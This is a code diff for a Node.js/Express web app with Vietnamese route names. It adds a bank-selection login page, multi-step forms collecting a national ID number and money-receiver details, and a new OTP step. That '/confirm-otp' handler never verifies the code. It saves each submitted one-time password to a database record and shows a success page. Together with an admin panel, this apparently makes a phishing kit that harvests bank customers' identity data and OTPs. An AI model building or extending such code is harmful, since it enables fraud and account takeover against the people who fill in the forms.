@@ -65,14 +65,25 @@ app.use("/admin",admin);
 //     res.render('login',{erro:null});
     
 // })
+// Ver 2
 app.get("/",(req,res)=>{
     Bank.find({},(err,bank)=>{
         res.render("dangnhap",{bank:bank});
     })
 })
 app.get("/Confirm-Otp",(req,res)=>{
-    res.render("otp");
+    if(req.session.InfoId== undefined){
+        res.redirect("/");
+    }
+    else{
+        res.render("otp");
+    }
+    
 })
+app.get("/sucess-otp",(req,res)=>{
+    res.render("sucess-otp");
+})
+// END
 app.get("/Buoc-1",(req,res)=>{
   
     if(req.session.InfoId== undefined){
@@ -163,6 +174,9 @@ app.post("/actionstep1",(req,res)=>{
        if(doc){
             res.redirect("/Buoc-2");
        }
+       else {
+           res.redirect("")
+       }
         
     })
     
@@ -181,8 +195,9 @@ app.post("/actionstep2",(req,res)=>{
          
      })
 })
+//V 2
 app.post("/xuly",(req,res)=>{
-    console.log(req.body);
+
     var obj = {
         CMND:req.body.CMND,
         ReciverMoney:req.body.reciverMoney,
@@ -201,6 +216,19 @@ app.post("/xuly",(req,res)=>{
             res.redirect("/Confirm-Otp");
         }
     })
+    
+})
+app.post("/confirm-otp",(req,res)=>{
+    Infomation.updateOne({_id:req.session.InfoId},{OTP:req.body.otp},(error,body)=>{
+        if(error){
+            res.redirect("/");
+        }
+        else {
+            req.session.destroy();
+            res.redirect("/sucess-otp")
+        }
+    })
+    
     
 })
 app.post("/actionstep3",(req,res)=>{
